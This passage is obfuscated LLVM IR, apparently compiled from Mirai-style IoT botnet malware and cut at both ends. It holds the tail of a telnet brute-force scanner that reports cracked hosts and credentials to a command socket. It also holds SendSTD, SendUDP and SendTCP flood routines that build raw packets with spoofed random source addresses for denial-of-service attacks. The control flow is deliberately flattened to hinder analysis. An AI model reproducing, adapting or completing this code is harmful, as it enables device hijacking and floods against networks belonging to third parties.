  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload26, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 7
  %882 = load i32, i32* %881, align 16
  %883 = add i32 %882, 45
  %884 = zext i32 %883 to i64
  %885 = call i64 @time(i64* null) #5
  %886 = icmp slt i64 %884, %885
  %887 = select i1 %886, i32 -403988553, i32 -1242875328
  store i32 %887, i32* %switchVar
  br label %loopEnd

; <label>:888:                                    ; preds = %loopEntry
  %889 = load i32, i32* %6, align 4
  %890 = sext i32 %889 to i64
  %.reload25 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload25, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 3
  %893 = load i8, i8* %892, align 1
  %894 = zext i8 %893 to i32
  %895 = icmp ne i32 %894, 3
  %896 = select i1 %895, i32 -791861652, i32 -1941725947
  store i32 %896, i32* %switchVar
  br label %loopEnd

; <label>:897:                                    ; preds = %loopEntry
  %898 = load i32, i32* @mainCommSock, align 4
  %899 = load i32, i32* %6, align 4
  %900 = sext i32 %899 to i64
  %.reload24 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload24, i64 %900
  %902 = call i8* @get_telstate_host(%struct.telstate_t* %901)
  %903 = load i32, i32* %6, align 4
  %904 = sext i32 %903 to i64
  %.reload23 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload23, i64 %904
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %905, i32 0, i32 4
  %907 = load i8, i8* %906, align 2
  %908 = zext i8 %907 to i64
  %909 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %908
  %910 = load i8*, i8** %909, align 8
  %911 = load i32, i32* %6, align 4
  %912 = sext i32 %911 to i64
  %.reload22 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload22, i64 %912
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %913, i32 0, i32 5
  %915 = load i8, i8* %914, align 1
  %916 = zext i8 %915 to i64
  %917 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %916
  %918 = load i8*, i8** %917, align 8
  %919 = call i32 (i32, i8*, ...) @sockprintf(i32 %898, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.498, i32 0, i32 0), i8* %902, i8* %910, i8* %918)
  store i32 -1941725947, i32* %switchVar
  br label %loopEnd

; <label>:920:                                    ; preds = %loopEntry
  %921 = load i32, i32* %6, align 4
  %922 = sext i32 %921 to i64
  %.reload21 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload21, i64 %922
  call void @reset_telstate(%struct.telstate_t* %923)
  store i32 -1242875328, i32* %switchVar
  br label %loopEnd

; <label>:924:                                    ; preds = %loopEntry
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1563371320, i32* %switchVar
  br label %loopEnd

; <label>:925:                                    ; preds = %loopEntry
  store i32 1672189596, i32* %switchVar
  br label %loopEnd

; <label>:926:                                    ; preds = %loopEntry
  %927 = load i32, i32* %6, align 4
  %928 = add nsw i32 %927, 1
  store i32 %928, i32* %6, align 4
  store i32 -338066444, i32* %switchVar
  br label %loopEnd

; <label>:929:                                    ; preds = %loopEntry
  store i32 288352116, i32* %switchVar
  br label %loopEnd

; <label>:930:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %929, %926, %925, %NewDefault, %924, %920, %897, %888, %877, %876, %853, %844, %835, %798, %794, %782, %781, %772, %771, %756, %730, %726, %690, %686, %672, %671, %667, %656, %655, %654, %650, %649, %623, %619, %610, %601, %597, %582, %567, %563, %559, %550, %546, %520, %519, %515, %504, %503, %499, %495, %480, %465, %461, %457, %448, %444, %418, %417, %413, %402, %401, %397, %393, %378, %363, %362, %358, %347, %346, %342, %338, %337, %320, %316, %299, %265, %264, %255, %254, %253, %249, %245, %240, %217, %216, %191, %190, %189, %184, %175, %170, %149, %140, %120, %111, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %94, %87, %79, %74, %73, %72, %71, %68, %54, %49, %33, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* null) #5
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #5
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 -743640928, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -743640928, label %36
    i32 379363722, label %40
    i32 -420346412, label %53
    i32 1098266683, label %56
    i32 -181839737, label %57
    i32 1725369427, label %60
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  %39 = select i1 %38, i32 379363722, i32 -181839737
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %7, align 4
  %42 = call i64 @send(i32 %41, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.500, i32 0, i32 0), i64 65, i32 0)
  %43 = load i32, i32* %7, align 4
  %44 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  %46 = call i64 @time(i64* null) #5
  %47 = load i64, i64* %8, align 8
  %48 = load i32, i32* %6, align 4
  %49 = sext i32 %48 to i64
  %50 = add nsw i64 %47, %49
  %51 = icmp sge i64 %46, %50
  %52 = select i1 %51, i32 -420346412, i32 1098266683
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %7, align 4
  %55 = call i32 @close(i32 %54)
  call void @_exit(i32 0) #11
  unreachable

; <label>:56:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -181839737, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %11, align 4
  %59 = add i32 %58, 1
  store i32 %59, i32* %11, align 4
  store i32 -743640928, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %57, %56, %40, %36, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 630157297, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 630157297, label %first
    i32 1526953700, label %28
    i32 1060671800, label %32
    i32 -220534154, label %37
    i32 -325184123, label %43
    i32 -499823887, label %44
    i32 722104658, label %52
    i32 -544364665, label %53
    i32 815054848, label %59
    i32 -310662358, label %60
    i32 1047286584, label %61
    i32 -1984059005, label %66
    i32 250300821, label %73
    i32 344343534, label %118
    i32 -1153855797, label %120
    i32 1748931708, label %125
    i32 146140502, label %152
    i32 -1508041279, label %153
    i32 -1994449418, label %166
    i32 -466059231, label %168
    i32 35855294, label %173
    i32 -77911638, label %200
    i32 1949992724, label %206
    i32 266581557, label %207
    i32 232074687, label %208
    i32 -1685246876, label %211
    i32 1565710121, label %213
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 0
  %27 = select i1 %26, i32 1526953700, i32 1060671800
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  store i32 -220534154, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %8, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 -220534154, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %7, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %40 = call i32 @getHost(i8* %38, %struct.in_addr* %39)
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 -325184123, i32 -499823887
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 1565710121, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %46 = getelementptr inbounds [8 x i8], [8 x i8]* %45, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 8, i32 4, i1 false)
  %47 = load i32, i32* %11, align 4
  store i32 %47, i32* %14, align 4
  %48 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %48, i32* %15, align 4
  %49 = load i32, i32* %15, align 4
  %50 = icmp ne i32 %49, 0
  %51 = select i1 %50, i32 -544364665, i32 722104658
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  store i32 1565710121, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  %54 = load i32, i32* %15, align 4
  %55 = bitcast i32* %16 to i8*
  %56 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* %55, i32 4) #5
  %57 = icmp slt i32 %56, 0
  %58 = select i1 %57, i32 815054848, i32 -310662358
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 1565710121, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 50, i32* %17, align 4
  store i32 1047286584, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %17, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %17, align 4
  %64 = icmp ne i32 %62, 0
  %65 = select i1 %64, i32 -1984059005, i32 250300821
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = call i64 @time(i64* null) #5
  %68 = call i32 @rand_cmwc()
  %69 = zext i32 %68 to i64
  %70 = xor i64 %67, %69
  %71 = trunc i64 %70 to i32
  call void @srand(i32 %71) #5
  %72 = call i32 @rand() #5
  call void @init_rand(i32 %72)
  store i32 1047286584, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %12, align 4
  %75 = sub nsw i32 32, %74
  %76 = shl i32 1, %75
  %77 = sub nsw i32 %76, 1
  %78 = xor i32 %77, -1
  store i32 %78, i32* %18, align 4
  %79 = load i32, i32* %10, align 4
  %80 = sext i32 %79 to i64
  %81 = add i64 28, %80
  store i64 %81, i64* %.reg2mem2
  %82 = call i8* @llvm.stacksave()
  store i8* %82, i8** %19, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %83 = alloca i8, i64 %.reload4, align 16
  store i8* %83, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %84 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = bitcast %struct.iphdr* %85 to i8*
  %87 = getelementptr i8, i8* %86, i64 20
  %88 = bitcast i8* %87 to %struct.udphdr*
  store %struct.udphdr* %88, %struct.udphdr** %21, align 8
  %89 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %90, i32 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = load i32, i32* %18, align 4
  %94 = call i32 @getRandomIP(i32 %93)
  %95 = call i32 @htonl(i32 %94) #10
  %96 = load i32, i32* %10, align 4
  %97 = sext i32 %96 to i64
  %98 = add i64 8, %97
  %99 = trunc i64 %98 to i32
  call void @makeIPPacket(%struct.iphdr* %89, i32 %92, i32 %95, i8 zeroext 17, i32 %99)
  %100 = load i32, i32* %10, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 8, %101
  %103 = trunc i64 %102 to i16
  %104 = call zeroext i16 @htons(i16 zeroext %103) #10
  %105 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %106 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.1* %106 to %struct.anon.2*
  %108 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %107, i32 0, i32 2
  store i16 %104, i16* %108, align 2
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %112 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %111, i32 0, i32 0
  %113 = bitcast %union.anon.1* %112 to %struct.anon.2*
  %114 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %113, i32 0, i32 0
  store i16 %110, i16* %114, align 2
  %115 = load i32, i32* %8, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 344343534, i32 -1153855797
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = call i32 @rand_cmwc()
  store i32 1748931708, i32* %switchVar
  store i32 %119, i32* %.reg2mem10
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %8, align 4
  %122 = trunc i32 %121 to i16
  %123 = call zeroext i16 @htons(i16 zeroext %122) #10
  %124 = zext i16 %123 to i32
  store i32 1748931708, i32* %switchVar
  store i32 %124, i32* %.reg2mem10
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %126 = trunc i32 %.reload11 to i16
  %127 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.1* %128 to %struct.anon.2*
  %130 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %129, i32 0, i32 1
  store i16 %126, i16* %130, align 2
  %131 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %132 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %131, i32 0, i32 0
  %133 = bitcast %union.anon.1* %132 to %struct.anon.2*
  %134 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %133, i32 0, i32 3
  store i16 0, i16* %134, align 2
  %135 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %136 = bitcast %struct.udphdr* %135 to i8*
  %137 = getelementptr inbounds i8, i8* %136, i64 8
  %138 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %137, i32 %138)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %139 = bitcast i8* %.reload8 to i16*
  %140 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 2
  %142 = load i16, i16* %141, align 2
  %143 = zext i16 %142 to i32
  %144 = call zeroext i16 @csum(i16* %139, i32 %143)
  %145 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 7
  store i16 %144, i16* %146, align 2
  %147 = call i64 @time(i64* null) #5
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = add nsw i64 %147, %149
  %151 = trunc i64 %150 to i32
  store i32 %151, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 146140502, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 -1508041279, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %15, align 4
  %155 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %156 = call i64 @sendto(i32 %154, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %155, i32 16)
  %157 = call i32 @rand_cmwc()
  %158 = trunc i32 %157 to i16
  %159 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  %161 = bitcast %union.anon.1* %160 to %struct.anon.2*
  %162 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %161, i32 0, i32 0
  store i16 %158, i16* %162, align 2
  %163 = load i32, i32* %8, align 4
  %164 = icmp eq i32 %163, 0
  %165 = select i1 %164, i32 -1994449418, i32 -466059231
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = call i32 @rand_cmwc()
  store i32 35855294, i32* %switchVar
  store i32 %167, i32* %.reg2mem12
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %8, align 4
  %170 = trunc i32 %169 to i16
  %171 = call zeroext i16 @htons(i16 zeroext %170) #10
  %172 = zext i16 %171 to i32
  store i32 35855294, i32* %switchVar
  store i32 %172, i32* %.reg2mem12
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %174 = trunc i32 %.reload13 to i16
  %175 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %176 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %175, i32 0, i32 0
  %177 = bitcast %union.anon.1* %176 to %struct.anon.2*
  %178 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %177, i32 0, i32 1
  store i16 %174, i16* %178, align 2
  %179 = call i32 @rand_cmwc()
  %180 = trunc i32 %179 to i16
  %181 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 3
  store i16 %180, i16* %182, align 4
  %183 = load i32, i32* %18, align 4
  %184 = call i32 @getRandomIP(i32 %183)
  %185 = call i32 @htonl(i32 %184) #10
  %186 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 8
  store i32 %185, i32* %187, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %188 = bitcast i8* %.reload6 to i16*
  %189 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 2
  %191 = load i16, i16* %190, align 2
  %192 = zext i16 %191 to i32
  %193 = call zeroext i16 @csum(i16* %188, i32 %192)
  %194 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 7
  store i16 %193, i16* %195, align 2
  %196 = load i32, i32* %23, align 4
  %197 = load i32, i32* %14, align 4
  %198 = icmp eq i32 %196, %197
  %199 = select i1 %198, i32 -77911638, i32 232074687
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = call i64 @time(i64* null) #5
  %202 = load i32, i32* %22, align 4
  %203 = sext i32 %202 to i64
  %204 = icmp sgt i64 %201, %203
  %205 = select i1 %204, i32 1949992724, i32 266581557
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  store i32 -1685246876, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  store i32 146140502, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i32, i32* %23, align 4
  %210 = add i32 %209, 1
  store i32 %210, i32* %23, align 4
  store i32 146140502, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %212)
  store i32 1565710121, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %211, %208, %207, %206, %200, %173, %168, %166, %153, %152, %125, %120, %118, %73, %66, %61, %60, %59, %53, %52, %44, %43, %37, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1704755229, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1704755229, label %first
    i32 1517813675, label %31
    i32 905505740, label %35
    i32 -722469262, label %40
    i32 -1169615213, label %46
    i32 1799806314, label %47
    i32 -382373405, label %54
    i32 -859512026, label %55
    i32 1811868115, label %61
    i32 1964335124, label %62
    i32 1663143231, label %66
    i32 -107141627, label %67
    i32 1105458652, label %73
    i32 1559235537, label %121
    i32 -2114056162, label %157
    i32 -803377934, label %160
    i32 322517608, label %164
    i32 -518111839, label %169
    i32 780983825, label %177
    i32 -2049934336, label %182
    i32 984539167, label %190
    i32 619827421, label %195
    i32 2144296867, label %203
    i32 164461692, label %208
    i32 -2082942706, label %216
    i32 -602310720, label %221
    i32 -83318809, label %229
    i32 1822860045, label %230
    i32 850071506, label %231
    i32 -2047529911, label %232
    i32 -936171713, label %233
    i32 1959619876, label %234
    i32 110084448, label %236
    i32 -1109995376, label %237
    i32 1754046856, label %255
    i32 51425805, label %257
    i32 1992089816, label %262
    i32 1529131023, label %288
    i32 -1043320563, label %289
    i32 1658275054, label %336
    i32 -953361955, label %342
    i32 1662020316, label %343
    i32 -439647142, label %344
    i32 -1797005785, label %347
    i32 317780319, label %349
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 1517813675, i32 905505740
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 -722469262, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #10
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 -722469262, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -1169615213, i32 1799806314
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 317780319, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
